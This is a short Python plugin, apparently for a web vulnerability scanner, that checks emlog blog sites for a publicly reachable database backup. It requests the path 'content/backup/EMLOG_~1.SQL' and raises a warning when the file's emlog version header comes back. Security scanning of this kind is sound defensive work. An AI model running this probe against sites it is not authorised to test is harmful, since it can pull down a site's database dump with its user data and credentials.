#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = emlog database
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-099976

def assign(service, arg):
    if service == 'emlog':
        return True, arg

def audit(arg):
    payload = 'content/backup/EMLOG_~1.SQL'
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl2(target);
    if code == 200 and '#version:emlog' in body:
        security_warning(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('emlog', 'http://127.0.0.1/emlog/')[1])